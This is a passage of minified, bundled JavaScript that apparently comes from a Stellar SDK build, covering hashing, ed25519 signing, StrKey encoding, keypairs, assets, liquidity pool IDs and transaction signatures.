    return hasRequiredJsxdr || (hasRequiredJsxdr = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.default = void 0;
        var M = requireXdr$1()
          , j = {
            XdrWriter: M.XdrWriter,
            XdrReader: M.XdrReader
        };
        _.default = j
    }(jsxdr)),
    jsxdr
}
var hashing = {}, hasRequiredHashing;
function requireHashing() {
    if (hasRequiredHashing)
        return hashing;
    hasRequiredHashing = 1,
    Object.defineProperty(hashing, "__esModule", {
        value: !0
    }),
    hashing.hash = M;
    var _ = requireSha_js();
    function M(j) {
        var O = new _.sha256;
        return O.update(j, "utf8"),
        O.digest()
    }
    return hashing
}
var signing = {}, hasRequiredSigning;
function requireSigning() {
    if (hasRequiredSigning)
        return signing;
    hasRequiredSigning = 1,
    Object.defineProperty(signing, "__esModule", {
        value: !0
    }),
    signing.FastSigning = void 0,
    signing.generate = O,
    signing.sign = M,
    signing.verify = j;
    var _ = {};
    signing.FastSigning = x();
    function M(X, Y) {
        return _.sign(X, Y)
    }
    function j(X, Y, F) {
        return _.verify(X, Y, F)
    }
    function O(X) {
        return _.generate(X)
    }
    function x() {
        return typeof window > "u" ? w() : b()
    }
    function w() {
        var X;
        try {
            X = require$$0$1
        } catch {
            return b()
        }
        return Object.keys(X).length ? (_.generate = function(Y) {
            var F = Buffer.alloc(X.crypto_sign_PUBLICKEYBYTES)
              , V = Buffer.alloc(X.crypto_sign_SECRETKEYBYTES);
            return X.crypto_sign_seed_keypair(F, V, Y),
            F
        }
        ,
        _.sign = function(Y, F) {
            Y = Buffer.from(Y);
            var V = Buffer.alloc(X.crypto_sign_BYTES);
            return X.crypto_sign_detached(V, Y, F),
            V
        }
        ,
        _.verify = function(Y, F, V) {
            Y = Buffer.from(Y);
            try {
                return X.crypto_sign_verify_detached(F, Y, V)
            } catch {
                return !1
            }
        }
        ,
        !0) : b()
    }
    function b() {
        var X = requireNaclFast();
        return _.generate = function(Y) {
            var F = new Uint8Array(Y)
              , V = X.sign.keyPair.fromSeed(F);
            return Buffer.from(V.publicKey)
        }
        ,
        _.sign = function(Y, F) {
            Y = Buffer.from(Y),
            Y = new Uint8Array(Y.toJSON().data),
            F = new Uint8Array(F.toJSON().data);
            var V = X.sign.detached(Y, F);
            return Buffer.from(V)
        }
        ,
        _.verify = function(Y, F, V) {
            return Y = Buffer.from(Y),
            Y = new Uint8Array(Y.toJSON().data),
            F = new Uint8Array(F.toJSON().data),
            V = new Uint8Array(V.toJSON().data),
            X.sign.detached.verify(Y, F, V)
        }
        ,
        !1
    }
    return signing
}
var get_liquidity_pool_id = {}, asset = {}, util = {}, hasRequiredUtil;
function requireUtil() {
    return hasRequiredUtil || (hasRequiredUtil = 1,
    Object.defineProperty(util, "__esModule", {
        value: !0
    }),
    util.trimEnd = void 0,
    util.trimEnd = function(M, j) {
        for (var O = typeof M == "number", x = String(M); x.endsWith(j); )
            x = x.slice(0, -1);
        return O ? Number(x) : x
    }
    ),
    util
}
var keypair = {}, strkey = {}, checksum = {}, hasRequiredChecksum;
function requireChecksum() {
    if (hasRequiredChecksum)
        return checksum;
    hasRequiredChecksum = 1,
    Object.defineProperty(checksum, "__esModule", {
        value: !0
    }),
    checksum.verifyChecksum = _;
    function _(M, j) {
        if (M.length !== j.length)
            return !1;
        if (M.length === 0)
            return !0;
        for (var O = 0; O < M.length; O += 1)
            if (M[O] !== j[O])
                return !1;
        return !0
    }
    return checksum
}
var hasRequiredStrkey;
function requireStrkey() {
    if (hasRequiredStrkey)
        return strkey;
    hasRequiredStrkey = 1,
    Object.defineProperty(strkey, "__esModule", {
        value: !0
    }),
    strkey.StrKey = void 0,
    strkey.decodeCheck = Q,
    strkey.encodeCheck = ee;
    var _ = j(requireBase32())
      , M = requireChecksum();
    function j(ne) {
        return ne && ne.__esModule ? ne : {
            default: ne
        }
    }
    function O(ne) {
        "@babel/helpers - typeof";
        return O = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(oe) {
            return typeof oe
        }
        : function(oe) {
            return oe && typeof Symbol == "function" && oe.constructor === Symbol && oe !== Symbol.prototype ? "symbol" : typeof oe
        }
        ,
        O(ne)
    }
    function x(ne, oe) {
        if (!(ne instanceof oe))
            throw new TypeError("Cannot call a class as a function")
    }
    function w(ne, oe) {
        for (var ue = 0; ue < oe.length; ue++) {
            var fe = oe[ue];
            fe.enumerable = fe.enumerable || !1,
            fe.configurable = !0,
            "value"in fe && (fe.writable = !0),
            Object.defineProperty(ne, X(fe.key), fe)
        }
    }
    function b(ne, oe, ue) {
        return ue && w(ne, ue),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        ne
    }
    function X(ne) {
        var oe = Y(ne, "string");
        return O(oe) == "symbol" ? oe : oe + ""
    }
    function Y(ne, oe) {
        if (O(ne) != "object" || !ne)
            return ne;
        var ue = ne[Symbol.toPrimitive];
        if (ue !== void 0) {
            var fe = ue.call(ne, oe);
            if (O(fe) != "object")
                return fe;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ne)
    }
    var F = {
        ed25519PublicKey: 48,
        ed25519SecretSeed: 144,
        med25519PublicKey: 96,
        preAuthTx: 152,
        sha256Hash: 184,
        signedPayload: 120,
        contract: 16
    }
      , V = {
        G: "ed25519PublicKey",
        S: "ed25519SecretSeed",
        M: "med25519PublicKey",
        T: "preAuthTx",
        X: "sha256Hash",
        P: "signedPayload",
        C: "contract"
    };
    strkey.StrKey = function() {
        function ne() {
            x(this, ne)
        }
        return b(ne, null, [{
            key: "encodeEd25519PublicKey",
            value: function(ue) {
                return ee("ed25519PublicKey", ue)
            }
        }, {
            key: "decodeEd25519PublicKey",
            value: function(ue) {
                return Q("ed25519PublicKey", ue)
            }
        }, {
            key: "isValidEd25519PublicKey",
            value: function(ue) {
                return K("ed25519PublicKey", ue)
            }
        }, {
            key: "encodeEd25519SecretSeed",
            value: function(ue) {
                return ee("ed25519SecretSeed", ue)
            }
        }, {
            key: "decodeEd25519SecretSeed",
            value: function(ue) {
                return Q("ed25519SecretSeed", ue)
            }
        }, {
            key: "isValidEd25519SecretSeed",
            value: function(ue) {
                return K("ed25519SecretSeed", ue)
            }
        }, {
            key: "encodeMed25519PublicKey",
            value: function(ue) {
                return ee("med25519PublicKey", ue)
            }
        }, {
            key: "decodeMed25519PublicKey",
            value: function(ue) {
                return Q("med25519PublicKey", ue)
            }
        }, {
            key: "isValidMed25519PublicKey",
            value: function(ue) {
                return K("med25519PublicKey", ue)
            }
        }, {
            key: "encodePreAuthTx",
            value: function(ue) {
                return ee("preAuthTx", ue)
            }
        }, {
            key: "decodePreAuthTx",
            value: function(ue) {
                return Q("preAuthTx", ue)
            }
        }, {
            key: "encodeSha256Hash",
            value: function(ue) {
                return ee("sha256Hash", ue)
            }
        }, {
            key: "decodeSha256Hash",
            value: function(ue) {
                return Q("sha256Hash", ue)
            }
        }, {
            key: "encodeSignedPayload",
            value: function(ue) {
                return ee("signedPayload", ue)
            }
        }, {
            key: "decodeSignedPayload",
            value: function(ue) {
                return Q("signedPayload", ue)
            }
        }, {
            key: "isValidSignedPayload",
            value: function(ue) {
                return K("signedPayload", ue)
            }
        }, {
            key: "encodeContract",
            value: function(ue) {
                return ee("contract", ue)
            }
        }, {
            key: "decodeContract",
            value: function(ue) {
                return Q("contract", ue)
            }
        }, {
            key: "isValidContract",
            value: function(ue) {
                return K("contract", ue)
            }
        }, {
            key: "getVersionByteForPrefix",
            value: function(ue) {
                return V[ue[0]]
            }
        }])
    }();
    function K(ne, oe) {
        if (typeof oe != "string")
            return !1;
        switch (ne) {
        case "ed25519PublicKey":
        case "ed25519SecretSeed":
        case "preAuthTx":
        case "sha256Hash":
        case "contract":
            if (oe.length !== 56)
                return !1;
            break;
        case "med25519PublicKey":
            if (oe.length !== 69)
                return !1;
            break;
        case "signedPayload":
            if (oe.length < 56 || oe.length > 165)
                return !1;
            break;
        default:
            return !1
        }
        var ue = "";
        try {
            ue = Q(ne, oe)
        } catch {
            return !1
        }
        switch (ne) {
        case "ed25519PublicKey":
        case "ed25519SecretSeed":
        case "preAuthTx":
        case "sha256Hash":
        case "contract":
            return ue.length === 32;
        case "med25519PublicKey":
            return ue.length === 40;
        case "signedPayload":
            return ue.length >= 40 && ue.length <= 100;
        default:
            return !1
        }
    }
    function Q(ne, oe) {
        if (typeof oe != "string")
            throw new TypeError("encoded argument must be of type String");
        var ue = _.default.decode(oe)
          , fe = ue[0]
          , he = ue.slice(0, -2)
          , pe = he.slice(1)
          , ye = ue.slice(-2);
        if (oe !== _.default.encode(ue))
            throw new Error("invalid encoded string");
        var be = F[ne];
        if (be === void 0)
            throw new Error("".concat(ne, " is not a valid version byte name. ") + "Expected one of ".concat(Object.keys(F).join(", ")));
        if (fe !== be)
            throw new Error("invalid version byte. expected ".concat(be, ", got ").concat(fe));
        var xe = ae(he);
        if (!(0,
        M.verifyChecksum)(xe, ye))
            throw new Error("invalid checksum");
        return Buffer.from(pe)
    }
    function ee(ne, oe) {
        if (oe == null)
            throw new Error("cannot encode null data");
        var ue = F[ne];
        if (ue === void 0)
            throw new Error("".concat(ne, " is not a valid version byte name. ") + "Expected one of ".concat(Object.keys(F).join(", ")));
        oe = Buffer.from(oe);
        var fe = Buffer.from([ue])
          , he = Buffer.concat([fe, oe])
          , pe = Buffer.from(ae(he))
          , ye = Buffer.concat([he, pe]);
        return _.default.encode(ye)
    }
    function ae(ne) {
        for (var oe = [0, 4129, 8258, 12387, 16516, 20645, 24774, 28903, 33032, 37161, 41290, 45419, 49548, 53677, 57806, 61935, 4657, 528, 12915, 8786, 21173, 17044, 29431, 25302, 37689, 33560, 45947, 41818, 54205, 50076, 62463, 58334, 9314, 13379, 1056, 5121, 25830, 29895, 17572, 21637, 42346, 46411, 34088, 38153, 58862, 62927, 50604, 54669, 13907, 9842, 5649, 1584, 30423, 26358, 22165, 18100, 46939, 42874, 38681, 34616, 63455, 59390, 55197, 51132, 18628, 22757, 26758, 30887, 2112, 6241, 10242, 14371, 51660, 55789, 59790, 63919, 35144, 39273, 43274, 47403, 23285, 19156, 31415, 27286, 6769, 2640, 14899, 10770, 56317, 52188, 64447, 60318, 39801, 35672, 47931, 43802, 27814, 31879, 19684, 23749, 11298, 15363, 3168, 7233, 60846, 64911, 52716, 56781, 44330, 48395, 36200, 40265, 32407, 28342, 24277, 20212, 15891, 11826, 7761, 3696, 65439, 61374, 57309, 53244, 48923, 44858, 40793, 36728, 37256, 33193, 45514, 41451, 53516, 49453, 61774, 57711, 4224, 161, 12482, 8419, 20484, 16421, 28742, 24679, 33721, 37784, 41979, 46042, 49981, 54044, 58239, 62302, 689, 4752, 8947, 13010, 16949, 21012, 25207, 29270, 46570, 42443, 38312, 34185, 62830, 58703, 54572, 50445, 13538, 9411, 5280, 1153, 29798, 25671, 21540, 17413, 42971, 47098, 34713, 38840, 59231, 63358, 50973, 55100, 9939, 14066, 1681, 5808, 26199, 30326, 17941, 22068, 55628, 51565, 63758, 59695, 39368, 35305, 47498, 43435, 22596, 18533, 30726, 26663, 6336, 2273, 14466, 10403, 52093, 56156, 60223, 64286, 35833, 39896, 43963, 48026, 19061, 23124, 27191, 31254, 2801, 6864, 10931, 14994, 64814, 60687, 56684, 52557, 48554, 44427, 40424, 36297, 31782, 27655, 23652, 19525, 15522, 11395, 7392, 3265, 61215, 65342, 53085, 57212, 44955, 49082, 36825, 40952, 28183, 32310, 20053, 24180, 11923, 16050, 3793, 7920], ue = 0, fe = 0; fe < ne.length; fe += 1) {
            var he = ne[fe]
              , pe = ue >> 8 ^ he;
            ue = ue << 8 ^ oe[pe],
            ue &= 65535
        }
        var ye = new Uint8Array(2);
        return ye[0] = ue & 255,
        ye[1] = ue >> 8 & 255,
        ye
    }
    return strkey
}
var hasRequiredKeypair;
function requireKeypair() {
    if (hasRequiredKeypair)
        return keypair;
    hasRequiredKeypair = 1,
    Object.defineProperty(keypair, "__esModule", {
        value: !0
    }),
    keypair.Keypair = void 0;
    var _ = w(requireNaclFast())
      , M = requireSigning()
      , j = requireStrkey()
      , O = requireHashing()
      , x = w(requireXdr());
    function w(Q) {
        return Q && Q.__esModule ? Q : {
            default: Q
        }
    }
    function b(Q) {
        "@babel/helpers - typeof";
        return b = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(ee) {
            return typeof ee
        }
        : function(ee) {
            return ee && typeof Symbol == "function" && ee.constructor === Symbol && ee !== Symbol.prototype ? "symbol" : typeof ee
        }
        ,
        b(Q)
    }
    function X(Q, ee) {
        if (!(Q instanceof ee))
            throw new TypeError("Cannot call a class as a function")
    }
    function Y(Q, ee) {
        for (var ae = 0; ae < ee.length; ae++) {
            var ne = ee[ae];
            ne.enumerable = ne.enumerable || !1,
            ne.configurable = !0,
            "value"in ne && (ne.writable = !0),
            Object.defineProperty(Q, V(ne.key), ne)
        }
    }
    function F(Q, ee, ae) {
        return ee && Y(Q.prototype, ee),
        ae && Y(Q, ae),
        Object.defineProperty(Q, "prototype", {
            writable: !1
        }),
        Q
    }
    function V(Q) {
        var ee = K(Q, "string");
        return b(ee) == "symbol" ? ee : ee + ""
    }
    function K(Q, ee) {
        if (b(Q) != "object" || !Q)
            return Q;
        var ae = Q[Symbol.toPrimitive];
        if (ae !== void 0) {
            var ne = ae.call(Q, ee);
            if (b(ne) != "object")
                return ne;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(Q)
    }
    return keypair.Keypair = function() {
        function Q(ee) {
            if (X(this, Q),
            ee.type !== "ed25519")
                throw new Error("Invalid keys type");
            if (this.type = ee.type,
            ee.secretKey) {
                if (ee.secretKey = Buffer.from(ee.secretKey),
                ee.secretKey.length !== 32)
                    throw new Error("secretKey length is invalid");
                if (this._secretSeed = ee.secretKey,
                this._publicKey = (0,
                M.generate)(ee.secretKey),
                this._secretKey = Buffer.concat([ee.secretKey, this._publicKey]),
                ee.publicKey && !this._publicKey.equals(Buffer.from(ee.publicKey)))
                    throw new Error("secretKey does not match publicKey")
            } else if (this._publicKey = Buffer.from(ee.publicKey),
            this._publicKey.length !== 32)
                throw new Error("publicKey length is invalid")
        }
        return F(Q, [{
            key: "xdrAccountId",
            value: function() {
                return new x.default.AccountId.publicKeyTypeEd25519(this._publicKey)
            }
        }, {
            key: "xdrPublicKey",
            value: function() {
                return new x.default.PublicKey.publicKeyTypeEd25519(this._publicKey)
            }
        }, {
            key: "xdrMuxedAccount",
            value: function(ae) {
                if (typeof ae < "u") {
                    if (typeof ae != "string")
                        throw new TypeError("expected string for ID, got ".concat(b(ae)));
                    return x.default.MuxedAccount.keyTypeMuxedEd25519(new x.default.MuxedAccountMed25519({
                        id: x.default.Uint64.fromString(ae),
                        ed25519: this._publicKey
                    }))
                }
                return new x.default.MuxedAccount.keyTypeEd25519(this._publicKey)
            }
        }, {
            key: "rawPublicKey",
            value: function() {
                return this._publicKey
            }
        }, {
            key: "signatureHint",
            value: function() {
                var ae = this.xdrAccountId().toXDR();
                return ae.slice(ae.length - 4)
            }
        }, {
            key: "publicKey",
            value: function() {
                return j.StrKey.encodeEd25519PublicKey(this._publicKey)
            }
        }, {
            key: "secret",
            value: function() {
                if (!this._secretSeed)
                    throw new Error("no secret key available");
                if (this.type === "ed25519")
                    return j.StrKey.encodeEd25519SecretSeed(this._secretSeed);
                throw new Error("Invalid Keypair type")
            }
        }, {
            key: "rawSecretKey",
            value: function() {
                return this._secretSeed
            }
        }, {
            key: "canSign",
            value: function() {
                return !!this._secretKey
            }
        }, {
            key: "sign",
            value: function(ae) {
                if (!this.canSign())
                    throw new Error("cannot sign: no secret key available");
                return (0,
                M.sign)(ae, this._secretKey)
            }
        }, {
            key: "verify",
            value: function(ae, ne) {
                return (0,
                M.verify)(ae, ne, this._publicKey)
            }
        }, {
            key: "signDecorated",
            value: function(ae) {
                var ne = this.sign(ae)
                  , oe = this.signatureHint();
                return new x.default.DecoratedSignature({
                    hint: oe,
                    signature: ne
                })
            }
        }, {
            key: "signPayloadDecorated",
            value: function(ae) {
                var ne = this.sign(ae)
                  , oe = this.signatureHint()
                  , ue = Buffer.from(ae.slice(-4));
                return ue.length < 4 && (ue = Buffer.concat([ue, Buffer.alloc(4 - ae.length, 0)])),
                new x.default.DecoratedSignature({
                    hint: ue.map(function(fe, he) {
                        return fe ^ oe[he]
                    }),
                    signature: ne
                })
            }
        }], [{
            key: "fromSecret",
            value: function(ae) {
                var ne = j.StrKey.decodeEd25519SecretSeed(ae);
                return this.fromRawEd25519Seed(ne)
            }
        }, {
            key: "fromRawEd25519Seed",
            value: function(ae) {
                return new this({
                    type: "ed25519",
                    secretKey: ae
                })
            }
        }, {
            key: "master",
            value: function(ae) {
                if (!ae)
                    throw new Error("No network selected. Please pass a network argument, e.g. `Keypair.master(Networks.PUBLIC)`.");
                return this.fromRawEd25519Seed((0,
                O.hash)(ae))
            }
        }, {
            key: "fromPublicKey",
            value: function(ae) {
                if (ae = j.StrKey.decodeEd25519PublicKey(ae),
                ae.length !== 32)
                    throw new Error("Invalid Stellar public key");
                return new this({
                    type: "ed25519",
                    publicKey: ae
                })
            }
        }, {
            key: "random",
            value: function() {
                var ae = _.default.randomBytes(32);
                return this.fromRawEd25519Seed(ae)
            }
        }])
    }(),
    keypair
}
var hasRequiredAsset;
function requireAsset() {
    if (hasRequiredAsset)
        return asset;
    hasRequiredAsset = 1,
    Object.defineProperty(asset, "__esModule", {
        value: !0
    }),
    asset.Asset = void 0;
    var _ = requireUtil()
      , M = w(requireXdr())
      , j = requireKeypair()
      , O = requireStrkey()
      , x = requireHashing();
    function w(ee) {
        return ee && ee.__esModule ? ee : {
            default: ee
        }
    }
    function b(ee) {
        "@babel/helpers - typeof";
        return b = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(ae) {
            return typeof ae
        }
        : function(ae) {
            return ae && typeof Symbol == "function" && ae.constructor === Symbol && ae !== Symbol.prototype ? "symbol" : typeof ae
        }
        ,
        b(ee)
    }
    function X(ee, ae) {
        if (!(ee instanceof ae))
            throw new TypeError("Cannot call a class as a function")
    }
    function Y(ee, ae) {
        for (var ne = 0; ne < ae.length; ne++) {
            var oe = ae[ne];
            oe.enumerable = oe.enumerable || !1,
            oe.configurable = !0,
            "value"in oe && (oe.writable = !0),
            Object.defineProperty(ee, V(oe.key), oe)
        }
    }
    function F(ee, ae, ne) {
        return ae && Y(ee.prototype, ae),
        ne && Y(ee, ne),
        Object.defineProperty(ee, "prototype", {
            writable: !1
        }),
        ee
    }
    function V(ee) {
        var ae = K(ee, "string");
        return b(ae) == "symbol" ? ae : ae + ""
    }
    function K(ee, ae) {
        if (b(ee) != "object" || !ee)
            return ee;
        var ne = ee[Symbol.toPrimitive];
        if (ne !== void 0) {
            var oe = ne.call(ee, ae);
            if (b(oe) != "object")
                return oe;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ee)
    }
    asset.Asset = function() {
        function ee(ae, ne) {
            if (X(this, ee),
            !/^[a-zA-Z0-9]{1,12}$/.test(ae))
                throw new Error("Asset code is invalid (maximum alphanumeric, 12 characters at max)");
            if (String(ae).toLowerCase() !== "xlm" && !ne)
                throw new Error("Issuer cannot be null");
            if (ne && !O.StrKey.isValidEd25519PublicKey(ne))
                throw new Error("Issuer is invalid");
            String(ae).toLowerCase() === "xlm" ? this.code = "XLM" : this.code = ae,
            this.issuer = ne
        }
        return F(ee, [{
            key: "toXDRObject",
            value: function() {
                return this._toXDRObject(M.default.Asset)
            }
        }, {
            key: "toChangeTrustXDRObject",
            value: function() {
                return this._toXDRObject(M.default.ChangeTrustAsset)
            }
        }, {
            key: "toTrustLineXDRObject",
            value: function() {
                return this._toXDRObject(M.default.TrustLineAsset)
            }
        }, {
            key: "contractId",
            value: function(ne) {
                var oe = (0,
                x.hash)(Buffer.from(ne))
                  , ue = M.default.HashIdPreimage.envelopeTypeContractId(new M.default.HashIdPreimageContractId({
                    networkId: oe,
                    contractIdPreimage: M.default.ContractIdPreimage.contractIdPreimageFromAsset(this.toXDRObject())
                }));
                return O.StrKey.encodeContract((0,
                x.hash)(ue.toXDR()))
            }
        }, {
            key: "_toXDRObject",
            value: function() {
                var ne = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : M.default.Asset;
                if (this.isNative())
                    return ne.assetTypeNative();
                var oe, ue;
                this.code.length <= 4 ? (oe = M.default.AlphaNum4,
                ue = "assetTypeCreditAlphanum4") : (oe = M.default.AlphaNum12,
                ue = "assetTypeCreditAlphanum12");
                var fe = this.code.length <= 4 ? 4 : 12
                  , he = this.code.padEnd(fe, "\0")
                  , pe = new oe({
                    assetCode: he,
                    issuer: j.Keypair.fromPublicKey(this.issuer).xdrAccountId()
                });
                return new ne(ue,pe)
            }
        }, {
            key: "getCode",
            value: function() {
                if (this.code !== void 0)
                    return String(this.code)
            }
        }, {
            key: "getIssuer",
            value: function() {
                if (this.issuer !== void 0)
                    return String(this.issuer)
            }
        }, {
            key: "getAssetType",
            value: function() {
                switch (this.getRawAssetType().value) {
                case M.default.AssetType.assetTypeNative().value:
                    return "native";
                case M.default.AssetType.assetTypeCreditAlphanum4().value:
                    return "credit_alphanum4";
                case M.default.AssetType.assetTypeCreditAlphanum12().value:
                    return "credit_alphanum12";
                default:
                    return "unknown"
                }
            }
        }, {
            key: "getRawAssetType",
            value: function() {
                return this.isNative() ? M.default.AssetType.assetTypeNative() : this.code.length <= 4 ? M.default.AssetType.assetTypeCreditAlphanum4() : M.default.AssetType.assetTypeCreditAlphanum12()
            }
        }, {
            key: "isNative",
            value: function() {
                return !this.issuer
            }
        }, {
            key: "equals",
            value: function(ne) {
                return this.code === ne.getCode() && this.issuer === ne.getIssuer()
            }
        }, {
            key: "toString",
            value: function() {
                return this.isNative() ? "native" : "".concat(this.getCode(), ":").concat(this.getIssuer())
            }
        }], [{
            key: "native",
            value: function() {
                return new ee("XLM")
            }
        }, {
            key: "fromOperation",
            value: function(ne) {
                var oe, ue, fe;
                switch (ne.switch()) {
                case M.default.AssetType.assetTypeNative():
                    return this.native();
                case M.default.AssetType.assetTypeCreditAlphanum4():
                    oe = ne.alphaNum4();
                case M.default.AssetType.assetTypeCreditAlphanum12():
                    return oe = oe || ne.alphaNum12(),
                    fe = O.StrKey.encodeEd25519PublicKey(oe.issuer().ed25519()),
                    ue = (0,
                    _.trimEnd)(oe.assetCode(), "\0"),
                    new this(ue,fe);
                default:
                    throw new Error("Invalid asset type: ".concat(ne.switch().name))
                }
            }
        }, {
            key: "compare",
            value: function(ne, oe) {
                if (!ne || !(ne instanceof ee))
                    throw new Error("assetA is invalid");
                if (!oe || !(oe instanceof ee))
                    throw new Error("assetB is invalid");
                if (ne.equals(oe))
                    return 0;
                var ue = ne.getRawAssetType().value
                  , fe = oe.getRawAssetType().value;
                if (ue !== fe)
                    return ue < fe ? -1 : 1;
                var he = Q(ne.getCode(), oe.getCode());
                return he !== 0 ? he : Q(ne.getIssuer(), oe.getIssuer())
            }
        }])
    }();
    function Q(ee, ae) {
        return Buffer.compare(Buffer.from(ee, "ascii"), Buffer.from(ae, "ascii"))
    }
    return asset
}
var hasRequiredGet_liquidity_pool_id;
function requireGet_liquidity_pool_id() {
    if (hasRequiredGet_liquidity_pool_id)
        return get_liquidity_pool_id;
    hasRequiredGet_liquidity_pool_id = 1,
    Object.defineProperty(get_liquidity_pool_id, "__esModule", {
        value: !0
    }),
    get_liquidity_pool_id.LiquidityPoolFeeV18 = void 0,
    get_liquidity_pool_id.getLiquidityPoolId = w;
    var _ = O(requireXdr())
      , M = requireAsset()
      , j = requireHashing();
    function O(b) {
        return b && b.__esModule ? b : {
            default: b
        }
    }
    var x = get_liquidity_pool_id.LiquidityPoolFeeV18 = 30;
    function w(b) {
        var X = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
        if (b !== "constant_product")
            throw new Error("liquidityPoolType is invalid");
        var Y = X.assetA
          , F = X.assetB
          , V = X.fee;
        if (!Y || !(Y instanceof M.Asset))
            throw new Error("assetA is invalid");
        if (!F || !(F instanceof M.Asset))
            throw new Error("assetB is invalid");
        if (!V || V !== x)
            throw new Error("fee is invalid");
        if (M.Asset.compare(Y, F) !== -1)
            throw new Error("Assets are not in lexicographic order");
        var K = _.default.LiquidityPoolType.liquidityPoolConstantProduct().toXDR()
          , Q = new _.default.LiquidityPoolConstantProductParameters({
            assetA: Y.toXDRObject(),
            assetB: F.toXDRObject(),
            fee: V
        }).toXDR()
          , ee = Buffer.concat([K, Q]);
        return (0,
        j.hash)(ee)
    }
    return get_liquidity_pool_id
}
var transaction_base = {}, hasRequiredTransaction_base;
function requireTransaction_base() {
    if (hasRequiredTransaction_base)
        return transaction_base;
    hasRequiredTransaction_base = 1,
    Object.defineProperty(transaction_base, "__esModule", {
        value: !0
    }),
    transaction_base.TransactionBase = void 0;
    var _ = O(requireXdr())
      , M = requireHashing()
      , j = requireKeypair();
    function O(V) {
        return V && V.__esModule ? V : {
            default: V
        }
    }
    function x(V) {
        "@babel/helpers - typeof";
        return x = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(K) {
            return typeof K
        }
        : function(K) {
            return K && typeof Symbol == "function" && K.constructor === Symbol && K !== Symbol.prototype ? "symbol" : typeof K
        }
        ,
        x(V)
    }
    function w(V, K) {
        if (!(V instanceof K))
            throw new TypeError("Cannot call a class as a function")
    }
    function b(V, K) {
        for (var Q = 0; Q < K.length; Q++) {
            var ee = K[Q];
            ee.enumerable = ee.enumerable || !1,
            ee.configurable = !0,
            "value"in ee && (ee.writable = !0),
            Object.defineProperty(V, Y(ee.key), ee)
        }
    }
    function X(V, K, Q) {
        return K && b(V.prototype, K),
        Object.defineProperty(V, "prototype", {
            writable: !1
        }),
        V
    }
    function Y(V) {
        var K = F(V, "string");
        return x(K) == "symbol" ? K : K + ""
    }
    function F(V, K) {
        if (x(V) != "object" || !V)
            return V;
        var Q = V[Symbol.toPrimitive];
        if (Q !== void 0) {
            var ee = Q.call(V, K);
            if (x(ee) != "object")
                return ee;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(V)
    }
    return transaction_base.TransactionBase = function() {
        function V(K, Q, ee, ae) {
            if (w(this, V),
            typeof ae != "string")
                throw new Error("Invalid passphrase provided to Transaction: expected a string but got a ".concat(x(ae)));
            this._networkPassphrase = ae,
            this._tx = K,
            this._signatures = Q,
            this._fee = ee
        }
        return X(V, [{
            key: "signatures",
            get: function() {
                return this._signatures
            },
            set: function(Q) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "tx",
            get: function() {
                return this._tx
            },
            set: function(Q) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "fee",
            get: function() {
                return this._fee
            },
            set: function(Q) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "networkPassphrase",
            get: function() {
                return this._networkPassphrase
            },
            set: function(Q) {
                this._networkPassphrase = Q
            }
        }, {
            key: "sign",
            value: function() {
                for (var Q = this, ee = this.hash(), ae = arguments.length, ne = new Array(ae), oe = 0; oe < ae; oe++)
                    ne[oe] = arguments[oe];
                ne.forEach(function(ue) {
                    var fe = ue.signDecorated(ee);
                    Q.signatures.push(fe)
                })
            }
        }, {
            key: "getKeypairSignature",
            value: function(Q) {
                return Q.sign(this.hash()).toString("base64")
            }
        }, {
            key: "addSignature",
            value: function() {
                var Q = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : ""
                  , ee = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "";
                if (!ee || typeof ee != "string")
                    throw new Error("Invalid signature");
                if (!Q || typeof Q != "string")
                    throw new Error("Invalid publicKey");
                var ae, ne, oe = Buffer.from(ee, "base64");
                try {
                    ae = j.Keypair.fromPublicKey(Q),
                    ne = ae.signatureHint()
                } catch {
                    throw new Error("Invalid publicKey")
                }
                if (!ae.verify(this.hash(), oe))
                    throw new Error("Invalid signature");
                this.signatures.push(new _.default.DecoratedSignature({
                    hint: ne,
                    signature: oe
                }))
            }
        }, {
            key: "addDecoratedSignature",
            value: function(Q) {
                this.signatures.push(Q)
            }
        }, {
            key: "signHashX",
            value: function(Q) {
                if (typeof Q == "string" && (Q = Buffer.from(Q, "hex")),
                Q.length > 64)
                    throw new Error("preimage cannnot be longer than 64 bytes");
                var ee = Q
                  , ae = (0,
                M.hash)(Q)
                  , ne = ae.slice(ae.length - 4);
                this.signatures.push(new _.default.DecoratedSignature({
                    hint: ne,
                    signature: ee
                }))
            }
        }, {
            key: "hash",
            value: function() {
                return (0,
                M.hash)(this.signatureBase())
            }
        }, {
            key: "signatureBase",
            value: function() {
                throw new Error("Implement in subclass")
            }
        }, {
            key: "toEnvelope",
            value: function() {
                throw new Error("Implement in subclass")
            }
        }, {
            key: "toXDR",
            value: function() {
                return this.toEnvelope().toXDR().toString("base64")
            }
        }])
    }(),
    transaction_base
}
var transaction = {}, operation = {}, bignumber$2 = {}, bignumber$1 = {
    exports: {}
}, bignumber = bignumber$1.exports, hasRequiredBignumber$1;
function requireBignumber$1() {
    return hasRequiredBignumber$1 || (hasRequiredBignumber$1 = 1,
    function(_) {
        (function(M) {
            var j, O = /^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i, x = Math.ceil, w = Math.floor, b = "[BigNumber Error] ", X = b + "Number primitive has more than 15 significant digits: ", Y = 1e14, F = 14, V = 9007199254740991, K = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13], Q = 1e7, ee = 1e9;
            function ae(be) {
                var xe, Ae, Ee, Be = Re.prototype = {
                    constructor: Re,
                    toString: null,
                    valueOf: null
